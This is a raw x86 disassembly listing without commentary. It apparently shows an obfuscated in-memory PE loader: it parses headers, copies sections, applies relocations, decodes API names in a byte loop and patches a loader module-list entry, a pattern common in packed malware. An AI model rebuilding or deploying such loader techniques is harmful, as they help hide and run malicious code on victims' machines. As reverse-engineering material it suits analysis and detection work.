  41c782:	mov    DWORD PTR [ebp-0x24],ecx
  41c785:	mov    ecx,DWORD PTR [ebp-0x4]
  41c788:	xor    ecx,esi
  41c78a:	add    ecx,DWORD PTR [eax+0xc]
  41c78d:	mov    eax,DWORD PTR [ebp+0x8]
  41c790:	lea    eax,[ecx+eax*1+0x3272e0]
  41c797:	mov    DWORD PTR [ebp+0xc],eax
  41c79a:	mov    DWORD PTR [ebp-0x28],0xf89c85bc
  41c7a1:	mov    eax,DWORD PTR [ebp+0x10]
  41c7a4:	push   DWORD PTR [ebp+0xc]
  41c7a7:	mov    eax,DWORD PTR [eax+0x1d8]
  41c7ad:	call   DWORD PTR [eax]
  41c7af:	mov    ecx,DWORD PTR [ebp-0x4]
  41c7b2:	xor    ecx,esi
  41c7b4:	add    ecx,edi
  41c7b6:	mov    DWORD PTR [ebp-0xc],eax
  41c7b9:	cmp    ecx,eax
  41c7bb:	jne    0x41c7cf
  41c7bd:	mov    eax,DWORD PTR [ebp+0x10]
  41c7c0:	push   DWORD PTR [ebp+0xc]
  41c7c3:	mov    eax,DWORD PTR [eax+0x1d8]
  41c7c9:	call   DWORD PTR [eax+0xc]
  41c7cc:	mov    DWORD PTR [ebp-0xc],eax
  41c7cf:	mov    DWORD PTR [ebp-0x20],0x7f661b00
  41c7d6:	mov    DWORD PTR [ebp-0x20],0xf89c9990
  41c7dd:	mov    eax,DWORD PTR [ebp-0x4]
  41c7e0:	xor    eax,esi
  41c7e2:	add    eax,edi
  41c7e4:	cmp    eax,DWORD PTR [ebp-0xc]
  41c7e7:	jne    0x41c80c
  41c7e9:	mov    eax,DWORD PTR [ebp-0x8]
  41c7ec:	mov    ecx,DWORD PTR [ebp-0x20]
  41c7ef:	xor    eax,esi
  41c7f1:	xor    ecx,esi
  41c7f3:	lea    ebx,[ebx+eax*1+0x3272e0]
  41c7fa:	mov    eax,DWORD PTR [ebp+0x10]
  41c7fd:	mov    eax,DWORD PTR [eax+0x1d8]
  41c803:	add    ecx,edi
  41c805:	imul   ecx,ebx
  41c808:	push   ecx
  41c809:	call   DWORD PTR [eax+0x24]
  41c80c:	mov    eax,DWORD PTR [ebp-0x4]
  41c80f:	xor    eax,esi
  41c811:	add    eax,edi
  41c813:	cmp    eax,DWORD PTR [ebp-0xc]
  41c816:	jne    0x41c827
  41c818:	mov    eax,DWORD PTR [ebp-0x28]
  41c81b:	xor    eax,esi
  41c81d:	add    eax,edi
  41c81f:	cmp    ebx,eax
  41c821:	jbe    0x41c7a1
  41c827:	mov    eax,DWORD PTR [ebp-0x4]
  41c82a:	xor    eax,esi
  41c82c:	add    eax,edi
  41c82e:	cmp    eax,DWORD PTR [ebp-0xc]
  41c831:	jne    0x41c84a
  41c833:	mov    eax,DWORD PTR [ebp-0x8]
  41c836:	mov    ecx,DWORD PTR [ebp-0x18]
  41c839:	xor    eax,esi
  41c83b:	lea    eax,[ecx+eax*1+0x3272e0]
  41c842:	mov    DWORD PTR [ebp-0x18],eax
  41c845:	jmp    0x41c939
  41c84a:	mov    DWORD PTR [ebp-0x14],0x1121b01
  41c851:	mov    DWORD PTR [ebp+0xc],0xe042d0f
  41c858:	mov    ebx,DWORD PTR [ebp-0x4]
  41c85b:	xor    ebx,esi
  41c85d:	add    ebx,edi
  41c85f:	jmp    0x41c926
  41c864:	mov    eax,DWORD PTR [ebp-0x4]
  41c867:	xor    eax,esi
  41c869:	add    eax,edi
  41c86b:	mov    DWORD PTR [ebp-0x14],eax
  41c86e:	mov    eax,DWORD PTR [ebp-0x4]
  41c871:	xor    eax,esi
  41c873:	add    eax,edi
  41c875:	mov    DWORD PTR [ebp+0xc],eax
  41c878:	mov    ecx,DWORD PTR [ebp-0x4]
  41c87b:	mov    eax,DWORD PTR [ebp-0x24]
  41c87e:	xor    ecx,esi
  41c880:	add    ecx,edi
  41c882:	cmp    ecx,eax
  41c884:	je     0x41c88c
  41c886:	mov    eax,DWORD PTR [eax+ebx*4]
  41c889:	mov    DWORD PTR [ebp-0x14],eax
  41c88c:	mov    eax,DWORD PTR [ebp-0x1c]
  41c88f:	mov    eax,DWORD PTR [eax+ebx*4]
  41c892:	mov    DWORD PTR [ebp+0xc],eax
  41c895:	mov    eax,DWORD PTR [ebp-0x4]
  41c898:	mov    ecx,DWORD PTR [ebp-0x14]
  41c89b:	xor    eax,esi
  41c89d:	add    eax,edi
  41c89f:	cmp    eax,ecx
  41c8a1:	je     0x41c8cc
  41c8a3:	mov    eax,DWORD PTR [ebp-0x4]
  41c8a6:	mov    ecx,DWORD PTR [ebp-0x14]
  41c8a9:	xor    eax,esi
  41c8ab:	add    eax,edi
  41c8ad:	shr    ecx,0x1f
  41c8b0:	cmp    eax,ecx
  41c8b2:	je     0x41c8cc
  41c8b4:	mov    ecx,DWORD PTR [ebp-0x14]
  41c8b7:	mov    eax,DWORD PTR [ebp+0x10]
  41c8ba:	mov    eax,DWORD PTR [eax+0x1d8]
  41c8c0:	movzx  ecx,cx
  41c8c3:	push   ecx
  41c8c4:	push   DWORD PTR [ebp-0xc]
  41c8c7:	call   DWORD PTR [eax+0x8]
  41c8ca:	jmp    0x41c8e5
  41c8cc:	mov    eax,DWORD PTR [ebp+0xc]
  41c8cf:	add    eax,DWORD PTR [ebp+0x8]
  41c8d2:	mov    ecx,DWORD PTR [ebp+0x10]
  41c8d5:	mov    ecx,DWORD PTR [ecx+0x1d8]
  41c8db:	add    eax,0x2
  41c8de:	push   eax
  41c8df:	push   DWORD PTR [ebp-0xc]
  41c8e2:	call   DWORD PTR [ecx+0x8]
  41c8e5:	mov    DWORD PTR [ebp+0xc],eax
  41c8e8:	mov    eax,DWORD PTR [ebp-0x4]
  41c8eb:	mov    ecx,DWORD PTR [ebp+0xc]
  41c8ee:	xor    eax,esi
  41c8f0:	add    eax,edi
  41c8f2:	cmp    eax,ecx
  41c8f4:	mov    eax,DWORD PTR [ebp-0x8]
  41c8f7:	jne    0x41c90a
  41c8f9:	mov    ecx,DWORD PTR [ebp-0x18]
  41c8fc:	xor    eax,esi
  41c8fe:	lea    eax,[ecx+eax*1+0x3272e0]
  41c905:	mov    DWORD PTR [ebp-0x18],eax
  41c908:	jmp    0x41c91a
  41c90a:	mov    ecx,DWORD PTR [ebp+0xc]
  41c90d:	xor    eax,esi
  41c90f:	add    eax,edi
  41c911:	imul   eax,ecx
  41c914:	mov    ecx,DWORD PTR [ebp-0x1c]
  41c917:	mov    DWORD PTR [ecx+ebx*4],eax
  41c91a:	mov    eax,DWORD PTR [ebp-0x8]
  41c91d:	xor    eax,esi
  41c91f:	lea    ebx,[ebx+eax*1+0x3272e0]
  41c926:	mov    eax,DWORD PTR [ebp-0x4]
  41c929:	mov    ecx,DWORD PTR [ebp-0x1c]
  41c92c:	xor    eax,esi
  41c92e:	add    eax,edi
  41c930:	cmp    DWORD PTR [ecx+ebx*4],eax
  41c933:	jne    0x41c864
  41c939:	mov    edx,DWORD PTR [ebp-0x10]
  41c93c:	mov    eax,DWORD PTR [ebp-0x18]
  41c93f:	mov    ecx,DWORD PTR [ebp-0x2c]
  41c942:	sub    edx,0x3272df
  41c948:	xor    edx,esi
  41c94a:	jmp    0x41c714
  41c94f:	mov    ecx,DWORD PTR [ebp-0x4]
  41c952:	xor    ecx,esi
  41c954:	add    ecx,edi
  41c956:	cmp    eax,ecx
  41c958:	mov    eax,DWORD PTR [ebp-0x4]
  41c95b:	jne    0x41c965
  41c95d:	mov    eax,DWORD PTR [ebp-0x8]
  41c960:	jmp    0x41c965
  41c962:	mov    eax,DWORD PTR [ebp-0x4]
  41c965:	xor    eax,esi
  41c967:	add    eax,edi
  41c969:	pop    edi
  41c96a:	pop    esi
  41c96b:	pop    ebx
  41c96c:	leave  
  41c96d:	ret    0xc
  41c970:	push   ebp
  41c971:	mov    ebp,esp
  41c973:	sub    esp,0x28
  41c976:	mov    DWORD PTR [ebp-0x4],0xf89c85b9
  41c97d:	mov    DWORD PTR [ebp-0x28],0xf89c85b8
  41c984:	mov    eax,DWORD PTR [ebp+0xc]
  41c987:	mov    DWORD PTR [ebp+0xc],eax
  41c98a:	push   esi
  41c98b:	mov    eax,eax
  41c98d:	mov    eax,DWORD PTR [ebp-0x4]
  41c990:	mov    esi,DWORD PTR [ebp+0x8]
  41c993:	mov    ecx,0x7510899
  41c998:	xor    eax,ecx
  41c99a:	mov    edx,0x3272e0
  41c99f:	add    eax,edx
  41c9a1:	cmp    esi,eax
  41c9a3:	je     0x41caca
  41c9a9:	mov    eax,DWORD PTR [ebp+0x8]
  41c9ac:	mov    esi,DWORD PTR [ebp+0x8]
  41c9af:	add    esi,DWORD PTR [eax+0x3c]
  41c9b2:	push   edi
  41c9b3:	mov    DWORD PTR [ebp+0xc],esi
  41c9b6:	mov    DWORD PTR [ebp-0x1c],0xf89c85bc
  41c9bd:	mov    eax,DWORD PTR [ebp-0x1c]
  41c9c0:	mov    esi,DWORD PTR [ebp-0x4]
  41c9c3:	mov    edi,DWORD PTR [ebp+0xc]
  41c9c6:	xor    esi,ecx
  41c9c8:	xor    eax,ecx
  41c9ca:	add    esi,edx
  41c9cc:	cmp    DWORD PTR [edi+eax*8+0x1939778],esi
  41c9d3:	je     0x41cac4
  41c9d9:	mov    esi,DWORD PTR [ebp+0xc]
  41c9dc:	mov    eax,DWORD PTR [ebp+0x8]
  41c9df:	add    eax,DWORD PTR [esi+0xa0]
  41c9e5:	mov    esi,DWORD PTR [ebp+0x8]
  41c9e8:	mov    edi,DWORD PTR [ebp+0xc]
  41c9eb:	sub    esi,DWORD PTR [edi+0x34]
  41c9ee:	mov    edi,DWORD PTR [ebp-0x4]
  41c9f1:	xor    edi,ecx
  41c9f3:	add    edi,edx
  41c9f5:	mov    DWORD PTR [ebp-0x24],esi
  41c9f8:	cmp    esi,edi
  41c9fa:	je     0x41cac4
  41ca00:	mov    esi,DWORD PTR [ebp-0x4]
  41ca03:	xor    esi,ecx
  41ca05:	add    esi,edx
  41ca07:	mov    DWORD PTR [ebp-0x8],esi
  41ca0a:	push   ebx
  41ca0b:	mov    DWORD PTR [ebp-0x10],0xf89c85ba
  41ca12:	jmp    0x41caae
  41ca17:	mov    esi,DWORD PTR [ebp-0x4]
  41ca1a:	xor    esi,ecx
  41ca1c:	lea    edi,[ebx-0x8]
  41ca1f:	add    esi,edx
  41ca21:	shr    edi,1
  41ca23:	cmp    esi,edi
  41ca25:	jae    0x41ca94
  41ca27:	sub    edi,esi
  41ca29:	lea    ebx,[eax+esi*2+0x8]
  41ca2d:	mov    DWORD PTR [ebp-0x18],edi
  41ca30:	movzx  esi,WORD PTR [ebx]
  41ca33:	and    esi,0xfff
  41ca39:	mov    DWORD PTR [ebp-0x14],esi
  41ca3c:	mov    edi,DWORD PTR [ebp-0x14]
  41ca3f:	mov    esi,DWORD PTR [eax]
  41ca41:	sub    esi,edx
  41ca43:	add    edi,esi
  41ca45:	movzx  esi,WORD PTR [ebx]
  41ca48:	shr    esi,0xc
  41ca4b:	xor    edi,ecx
  41ca4d:	mov    DWORD PTR [ebp-0x20],edi
  41ca50:	mov    DWORD PTR [ebp-0x14],esi
  41ca53:	mov    esi,DWORD PTR [ebp-0x20]
  41ca56:	mov    edi,DWORD PTR [ebp+0x8]
  41ca59:	xor    esi,ecx
  41ca5b:	lea    esi,[esi+edi*1+0x3272e0]
  41ca62:	mov    DWORD PTR [ebp-0x20],esi
  41ca65:	mov    esi,DWORD PTR [ebp-0x10]
  41ca68:	mov    edi,DWORD PTR [ebp-0x14]
  41ca6b:	xor    esi,ecx
  41ca6d:	add    esi,edx
  41ca6f:	cmp    edi,esi
  41ca71:	jne    0x41ca89
  41ca73:	mov    esi,DWORD PTR [ebp-0x10]
  41ca76:	mov    edi,DWORD PTR [ebp-0x14]
  41ca79:	xor    esi,ecx
  41ca7b:	add    esi,edx
  41ca7d:	cmp    edi,esi
  41ca7f:	jne    0x41ca89
  41ca81:	mov    esi,DWORD PTR [ebp-0x20]
  41ca84:	mov    edi,DWORD PTR [ebp-0x24]
  41ca87:	add    DWORD PTR [esi],edi
  41ca89:	add    ebx,0x2
  41ca8c:	dec    DWORD PTR [ebp-0x18]
  41ca8f:	jne    0x41ca30
  41ca91:	mov    ebx,DWORD PTR [ebp-0xc]
  41ca94:	add    DWORD PTR [ebp-0x8],ebx
  41ca97:	mov    esi,DWORD PTR [ebp-0x1c]
  41ca9a:	mov    edi,DWORD PTR [ebp-0x8]
  41ca9d:	mov    ebx,DWORD PTR [ebp+0xc]
  41caa0:	xor    esi,ecx
  41caa2:	cmp    edi,DWORD PTR [ebx+esi*8+0x193977c]
  41caa9:	jae    0x41cac3
  41caab:	add    eax,DWORD PTR [ebp-0xc]
  41caae:	mov    esi,DWORD PTR [ebp-0x4]
  41cab1:	mov    ebx,DWORD PTR [eax+0x4]
  41cab4:	xor    esi,ecx
  41cab6:	add    esi,edx
  41cab8:	mov    DWORD PTR [ebp-0xc],ebx
  41cabb:	cmp    ebx,esi
  41cabd:	jne    0x41ca17
  41cac3:	pop    ebx
  41cac4:	mov    eax,DWORD PTR [ebp-0x28]
  41cac7:	pop    edi
  41cac8:	jmp    0x41cacd
  41caca:	mov    eax,DWORD PTR [ebp-0x4]
  41cacd:	xor    eax,ecx
  41cacf:	add    eax,edx
  41cad1:	pop    esi
  41cad2:	leave  
  41cad3:	ret    0x8
  41cad6:	push   ebp
  41cad7:	mov    ebp,esp
  41cad9:	sub    esp,0xcc
  41cadf:	mov    DWORD PTR [ebp-0x4],0xf89c85b9
  41cae6:	mov    DWORD PTR [ebp-0x24],0xf89c85b8
  41caed:	mov    eax,DWORD PTR [ebp-0x4]
  41caf0:	push   ebx
  41caf1:	push   esi
  41caf2:	mov    esi,0x7510899
  41caf7:	xor    eax,esi
  41caf9:	push   edi
  41cafa:	mov    edi,0x3272e0
  41caff:	add    eax,edi
  41cb01:	mov    DWORD PTR [ebp-0x1c],eax
  41cb04:	mov    eax,DWORD PTR [ebp-0x4]
  41cb07:	xor    eax,esi
  41cb09:	add    eax,edi
  41cb0b:	mov    DWORD PTR [ebp-0x8],eax
  41cb0e:	mov    ebx,DWORD PTR [ebp+0x20]
  41cb11:	mov    eax,DWORD PTR [ebp-0x14]
  41cb14:	mov    ecx,DWORD PTR [ebp-0x14]
  41cb17:	xor    eax,ecx
  41cb19:	mov    DWORD PTR [ebp-0x14],eax
  41cb1c:	add    DWORD PTR [ebp-0x14],0xf89cb5b9
  41cb23:	mov    eax,DWORD PTR [ebp-0xc]
  41cb26:	mov    ecx,DWORD PTR [ebp-0xc]
  41cb29:	xor    eax,ecx
  41cb2b:	mov    DWORD PTR [ebp-0xc],eax
  41cb2e:	add    DWORD PTR [ebp-0xc],0xf89c85f9
  41cb35:	mov    eax,DWORD PTR [ebp-0x10]
  41cb38:	mov    ecx,DWORD PTR [ebp-0x10]
  41cb3b:	xor    eax,ecx
  41cb3d:	mov    DWORD PTR [ebp-0x10],eax
  41cb40:	add    DWORD PTR [ebp-0x10],0xf89c85bd
  41cb47:	mov    eax,DWORD PTR [ebp-0x20]
  41cb4a:	mov    ecx,DWORD PTR [ebp-0x20]
  41cb4d:	xor    eax,ecx
  41cb4f:	mov    DWORD PTR [ebp-0x20],eax
  41cb52:	add    DWORD PTR [ebp-0x20],0xf89f05b9
  41cb59:	mov    eax,0x9471
  41cb5e:	mov    WORD PTR [ebp+0x20],ax
  41cb62:	mov    eax,DWORD PTR [ebp+0x8]
  41cb65:	test   eax,eax
  41cb67:	je     0x41cfc2
  41cb6d:	mov    eax,DWORD PTR [ebp+0xc]
  41cb70:	test   eax,eax
  41cb72:	je     0x41cfc2
  41cb78:	mov    eax,DWORD PTR [ebp+0x18]
  41cb7b:	test   eax,eax
  41cb7d:	je     0x41cfc2
  41cb83:	mov    ax,WORD PTR [ebp+0x20]
  41cb87:	mov    ecx,0x8a8c
  41cb8c:	xor    ax,cx
  41cb8f:	mov    ecx,0x3b50
  41cb94:	add    ax,cx
  41cb97:	mov    ecx,DWORD PTR [ebp+0x8]
  41cb9a:	cmp    WORD PTR [ecx],ax
  41cb9d:	jne    0x41cfc2
  41cba3:	mov    eax,DWORD PTR [ebp-0x4]
  41cba6:	xor    eax,esi
  41cba8:	add    eax,edi
  41cbaa:	mov    DWORD PTR [ebp-0x30],eax
  41cbad:	mov    eax,DWORD PTR [ebp-0x4]
  41cbb0:	mov    ecx,DWORD PTR [ebp+0x8]
  41cbb3:	mov    eax,DWORD PTR [ebp+0x8]
  41cbb6:	add    eax,DWORD PTR [ecx+0x3c]
  41cbb9:	mov    DWORD PTR [ebp+0xc],eax
  41cbbc:	mov    eax,DWORD PTR [eax+0x50]
  41cbbf:	test   eax,eax
  41cbc1:	je     0x41cfc2
  41cbc7:	mov    DWORD PTR [ebp-0x2c],0xf88c85b9
  41cbce:	mov    eax,DWORD PTR [ebp-0x2c]
  41cbd1:	xor    eax,esi
  41cbd3:	add    eax,edi
  41cbd5:	mov    DWORD PTR [ebp-0x2c],eax
  41cbd8:	mov    eax,DWORD PTR [ebp-0x4]
  41cbdb:	mov    eax,DWORD PTR [ebx+0x190]
  41cbe1:	mov    ecx,DWORD PTR [eax]
  41cbe3:	mov    ecx,DWORD PTR [ecx+0x3c]
  41cbe6:	add    ecx,DWORD PTR [eax]
  41cbe8:	mov    eax,DWORD PTR [ebp-0x4]
  41cbeb:	mov    eax,DWORD PTR [ebx+0x18c]
  41cbf1:	mov    edx,DWORD PTR [eax]
  41cbf3:	mov    DWORD PTR [ebp-0x18],ecx
  41cbf6:	mov    DWORD PTR [ebp+0x20],edx
  41cbf9:	cmp    edx,edx
  41cbfb:	jne    0x41cc2f
  41cbfd:	mov    eax,DWORD PTR [ebx+0x1d8]
  41cc03:	lea    edx,[ebp-0x1c]
  41cc06:	push   edx
  41cc07:	mov    edx,DWORD PTR [ebp-0xc]
  41cc0a:	xor    edx,esi
  41cc0c:	add    edx,edi
  41cc0e:	push   edx
  41cc0f:	push   DWORD PTR [ecx+0x50]
  41cc12:	push   DWORD PTR [ebp+0x20]
  41cc15:	call   DWORD PTR [eax+0x1c]
  41cc18:	mov    eax,DWORD PTR [ebp-0x18]
  41cc1b:	mov    ecx,DWORD PTR [eax+0x54]
  41cc1e:	mov    eax,DWORD PTR [eax+0x50]
  41cc21:	sub    eax,ecx
  41cc23:	add    ecx,DWORD PTR [ebp+0x20]
  41cc26:	push   ecx
  41cc27:	call   0x41d5ae
  41cc2c:	mov    edx,DWORD PTR [ebp+0x20]
  41cc2f:	mov    eax,DWORD PTR [ebx+0x194]
  41cc35:	mov    DWORD PTR [eax],edx
  41cc37:	mov    eax,DWORD PTR [ebp+0xc]
  41cc3a:	push   DWORD PTR [eax+0x54]
  41cc3d:	push   DWORD PTR [ebp+0x8]
  41cc40:	push   edx
  41cc41:	call   0x41d455
  41cc46:	mov    ecx,DWORD PTR [ebp+0x20]
  41cc49:	mov    eax,DWORD PTR [ecx+0x3c]
  41cc4c:	add    eax,ecx
  41cc4e:	movzx  ecx,WORD PTR [eax+0x14]
  41cc52:	lea    ecx,[ecx+eax*1+0x18]
  41cc56:	mov    DWORD PTR [ebp+0x18],ecx
  41cc59:	mov    ecx,DWORD PTR [ebp-0x4]
  41cc5c:	movzx  edx,WORD PTR [eax+0x6]
  41cc60:	xor    ecx,esi
  41cc62:	add    ecx,edi
  41cc64:	mov    DWORD PTR [ebp+0xc],eax
  41cc67:	cmp    edx,ecx
  41cc69:	je     0x41cd16
  41cc6f:	mov    ecx,DWORD PTR [ebp-0x4]
  41cc72:	xor    ecx,esi
  41cc74:	add    ecx,edi
  41cc76:	mov    DWORD PTR [ebp-0x8],ecx
  41cc79:	mov    ecx,DWORD PTR [ebp-0x24]
  41cc7c:	movzx  edx,WORD PTR [eax+0x6]
  41cc80:	xor    ecx,esi
  41cc82:	sub    edx,ecx
  41cc84:	sub    edx,edi
  41cc86:	cmp    DWORD PTR [ebp-0x8],edx
  41cc89:	ja     0x41cd16
  41cc8f:	mov    edx,DWORD PTR [ebp+0x18]
  41cc92:	add    edx,0x8
  41cc95:	mov    DWORD PTR [ebp+0x18],edx
  41cc98:	jmp    0x41cc9d
  41cc9a:	mov    edx,DWORD PTR [ebp+0x18]
  41cc9d:	mov    eax,DWORD PTR [eax+0x38]
  41cca0:	lea    ecx,[eax-0x1]
  41cca3:	mov    DWORD PTR [ebp-0x34],eax
  41cca6:	mov    eax,DWORD PTR [edx]
  41cca8:	test   ecx,eax
  41ccaa:	je     0x41ccb3
  41ccac:	not    ecx
  41ccae:	and    eax,ecx
  41ccb0:	add    eax,DWORD PTR [ebp-0x34]
  41ccb3:	mov    ecx,DWORD PTR [edx+0x4]
  41ccb6:	add    ecx,DWORD PTR [ebp+0x20]
  41ccb9:	push   ecx
  41ccba:	call   0x41d5ae
  41ccbf:	mov    edx,DWORD PTR [ebp-0x4]
  41ccc2:	mov    eax,DWORD PTR [ebp+0x18]
  41ccc5:	mov    ecx,DWORD PTR [eax+0x8]
  41ccc8:	xor    edx,esi
  41ccca:	add    edx,edi
  41cccc:	cmp    ecx,edx
  41ccce:	je     0x41cce7
  41ccd0:	push   ecx
  41ccd1:	mov    ecx,DWORD PTR [ebp+0x8]
  41ccd4:	add    ecx,DWORD PTR [eax+0xc]
  41ccd7:	mov    eax,DWORD PTR [eax+0x4]
  41ccda:	add    eax,DWORD PTR [ebp+0x20]
  41ccdd:	push   ecx
  41ccde:	push   eax
  41ccdf:	call   0x41d455
  41cce4:	mov    eax,DWORD PTR [ebp+0x18]
  41cce7:	mov    ecx,DWORD PTR [ebp-0x24]
  41ccea:	mov    edx,DWORD PTR [ebp-0x8]
  41cced:	add    eax,0x28
  41ccf0:	xor    ecx,esi
  41ccf2:	lea    ecx,[edx+ecx*1+0x3272e0]
  41ccf9:	mov    edx,DWORD PTR [ebp+0xc]
  41ccfc:	mov    DWORD PTR [ebp+0x18],eax
  41ccff:	mov    eax,DWORD PTR [ebp-0x24]
  41cd02:	movzx  edx,WORD PTR [edx+0x6]
  41cd06:	xor    eax,esi
  41cd08:	sub    edx,eax
  41cd0a:	mov    eax,DWORD PTR [ebp+0xc]
  41cd0d:	sub    edx,edi
  41cd0f:	mov    DWORD PTR [ebp-0x8],ecx
  41cd12:	cmp    ecx,edx
  41cd14:	jbe    0x41cc9a
  41cd16:	mov    edx,DWORD PTR [ebx+0x18c]
  41cd1c:	mov    ecx,DWORD PTR [ebp+0x20]
  41cd1f:	cmp    ecx,DWORD PTR [edx]
  41cd21:	jne    0x41cd4a
  41cd23:	mov    eax,DWORD PTR [ebx+0x1d8]
  41cd29:	lea    edx,[ebp-0x1c]
  41cd2c:	push   edx
  41cd2d:	mov    edx,DWORD PTR [ebp-0x10]
  41cd30:	xor    edx,esi
  41cd32:	add    edx,edi
  41cd34:	push   edx
  41cd35:	mov    edx,DWORD PTR [ebp-0x18]
  41cd38:	push   DWORD PTR [edx+0x54]
  41cd3b:	push   ecx
  41cd3c:	call   DWORD PTR [eax+0x1c]
  41cd3f:	test   eax,eax
  41cd41:	je     0x41cfb3
  41cd47:	mov    eax,DWORD PTR [ebp+0xc]
  41cd4a:	mov    ecx,DWORD PTR [ebx+0x1c8]
  41cd50:	mov    ecx,DWORD PTR [ecx]
  41cd52:	xor    ecx,esi
  41cd54:	add    ecx,edi
  41cd56:	je     0x41cede
  41cd5c:	and    DWORD PTR [ebp-0x28],0x0
  41cd60:	and    DWORD PTR [ebp+0x8],0x0
  41cd64:	mov    eax,0xf89c851d
  41cd69:	lea    ecx,[eax-0x8]
  41cd6c:	mov    DWORD PTR [ebp-0x4c],0xf89c8517
  41cd73:	mov    DWORD PTR [ebp-0x48],0xf89c850d
  41cd7a:	mov    DWORD PTR [ebp-0x44],eax
  41cd7d:	mov    DWORD PTR [ebp-0x40],ecx
  41cd80:	mov    DWORD PTR [ebp-0x3c],ecx
  41cd83:	mov    DWORD PTR [ebp-0x38],0xf89c85b9
  41cd8a:	mov    edx,DWORD PTR [ebp+0x8]
  41cd8d:	mov    ecx,0x899
  41cd92:	xor    cx,WORD PTR [ebp+edx*4-0x4c]
  41cd97:	mov    edx,0x72e0
  41cd9c:	add    cx,dx
  41cd9f:	mov    edx,DWORD PTR [ebp+0x8]
  41cda2:	inc    DWORD PTR [ebp+0x8]
  41cda5:	cmp    DWORD PTR [ebp+0x8],0x6
  41cda9:	mov    WORD PTR [ebp+edx*2-0xb4],cx
  41cdb1:	jb     0x41cd8a
  41cdb3:	mov    ecx,0xf89c850b
  41cdb8:	mov    DWORD PTR [ebp-0xa4],eax
  41cdbe:	mov    DWORD PTR [ebp-0x90],eax
  41cdc4:	mov    DWORD PTR [ebp-0x68],eax
  41cdc7:	mov    DWORD PTR [ebp-0x64],eax
  41cdca:	lea    eax,[ecx-0x1]
  41cdcd:	mov    edx,0xf89c85ff
  41cdd2:	mov    DWORD PTR [ebp-0x58],eax
  41cdd5:	mov    DWORD PTR [ebp-0x54],eax
  41cdd8:	mov    DWORD PTR [ebp-0xa8],0xf89c85f5
  41cde2:	mov    DWORD PTR [ebp-0xa0],ecx
  41cde8:	mov    DWORD PTR [ebp-0x9c],edx
  41cdee:	mov    DWORD PTR [ebp-0x98],0xf89c8510
  41cdf8:	mov    DWORD PTR [ebp-0x94],0xf89c8517
  41ce02:	mov    DWORD PTR [ebp-0x8c],0xf89c85fc
  41ce0c:	mov    DWORD PTR [ebp-0x88],0xf89c8517
  41ce16:	mov    DWORD PTR [ebp-0x84],0xf89c850d
  41ce20:	mov    DWORD PTR [ebp-0x80],ecx
  41ce23:	mov    DWORD PTR [ebp-0x7c],0xf89c8500
  41ce2a:	mov    DWORD PTR [ebp-0x78],edx
  41ce2d:	mov    DWORD PTR [ebp-0x74],0xf89c8516
  41ce34:	mov    DWORD PTR [ebp-0x70],ecx
  41ce37:	mov    DWORD PTR [ebp-0x6c],0xf89c85f8
  41ce3e:	mov    DWORD PTR [ebp-0x60],ecx
  41ce41:	mov    DWORD PTR [ebp-0x5c],0xf89c851c
  41ce48:	mov    DWORD PTR [ebp-0x50],0xf89c85b9
  41ce4f:	xor    eax,eax
  41ce51:	mov    cl,BYTE PTR [ebp+eax*4-0xa8]
  41ce58:	xor    cl,0x99
  41ce5b:	sub    cl,0x20
  41ce5e:	mov    BYTE PTR [ebp+eax*1-0xcc],cl
  41ce65:	inc    eax
  41ce66:	cmp    eax,0x17
  41ce69:	jb     0x41ce51
  41ce6b:	mov    eax,DWORD PTR [ebx+0x1d8]
  41ce71:	lea    ecx,[ebp-0xb4]
  41ce77:	push   ecx
  41ce78:	call   DWORD PTR [eax+0x4]
  41ce7b:	mov    ecx,DWORD PTR [ebx+0x1d8]
  41ce81:	lea    edx,[ebp-0xcc]
  41ce87:	push   edx
  41ce88:	push   eax
  41ce89:	call   DWORD PTR [ecx+0x8]
  41ce8c:	lea    ecx,[ebp-0x28]
  41ce8f:	push   ecx
  41ce90:	mov    ecx,DWORD PTR [ebx+0x18c]
  41ce96:	push   DWORD PTR [ecx]
  41ce98:	call   eax
  41ce9a:	mov    eax,DWORD PTR [ebp-0x28]
  41ce9d:	test   eax,eax
  41ce9f:	je     0x41cedb
  41cea1:	mov    DWORD PTR [ebp+0x8],eax
  41cea4:	jmp    0x41ceb0
  41cea6:	mov    eax,DWORD PTR [eax]
  41cea8:	mov    DWORD PTR [ebp-0x28],eax
  41ceab:	cmp    eax,DWORD PTR [ebp+0x8]
  41ceae:	je     0x41cebd
  41ceb0:	mov    edx,DWORD PTR [eax+0x18]
  41ceb3:	mov    ecx,DWORD PTR [ebx+0x18c]
  41ceb9:	cmp    edx,DWORD PTR [ecx]
  41cebb:	jne    0x41cea6
  41cebd:	mov    edx,DWORD PTR [eax+0x18]
  41cec0:	mov    ecx,DWORD PTR [ebx+0x18c]
  41cec6:	cmp    edx,DWORD PTR [ecx]
  41cec8:	jne    0x41cedb
  41ceca:	mov    edx,DWORD PTR [ebp-0x18]
  41cecd:	mov    ecx,DWORD PTR [ebx+0x190]
  41ced3:	mov    edx,DWORD PTR [edx+0x28]
  41ced6:	add    edx,DWORD PTR [ecx]
  41ced8:	mov    DWORD PTR [eax+0x1c],edx
  41cedb:	mov    eax,DWORD PTR [ebp+0xc]
  41cede:	push   ebx
  41cedf:	push   eax
  41cee0:	push   DWORD PTR [ebp+0x20]
  41cee3:	call   0x41c68d
  41cee8:	test   eax,eax
  41ceea:	je     0x41cfb3
  41cef0:	push   DWORD PTR [ebp+0xc]
  41cef3:	mov    ecx,ebx
  41cef5:	push   DWORD PTR [ebp+0x20]
  41cef8:	call   0x41c5e6
  41cefd:	test   eax,eax
  41ceff:	je     0x41cfb3
  41cf05:	mov    eax,DWORD PTR [ebp+0xc]
  41cf08:	mov    edx,DWORD PTR [ebp+0x20]
  41cf0b:	mov    ecx,ebx
  41cf0d:	call   0x41c4bf
  41cf12:	test   eax,eax
  41cf14:	je     0x41cfb3
  41cf1a:	push   ebx
  41cf1b:	push   DWORD PTR [ebp+0x20]
  41cf1e:	call   0x41c970
  41cf23:	test   eax,eax
  41cf25:	je     0x41cfb3
  41cf2b:	mov    eax,DWORD PTR [ebx+0x18c]
  41cf31:	mov    edx,DWORD PTR [ebp+0x20]
  41cf34:	cmp    edx,DWORD PTR [eax]
  41cf36:	jne    0x41cf52
  41cf38:	mov    eax,DWORD PTR [ebx+0x1d8]
  41cf3e:	lea    ecx,[ebp-0x1c]
  41cf41:	push   ecx
  41cf42:	push   DWORD PTR [ebp-0x1c]
  41cf45:	mov    ecx,DWORD PTR [ebp-0x18]
  41cf48:	push   DWORD PTR [ecx+0x54]
  41cf4b:	push   edx
  41cf4c:	call   DWORD PTR [eax+0x1c]
  41cf4f:	mov    edx,DWORD PTR [ebp+0x20]
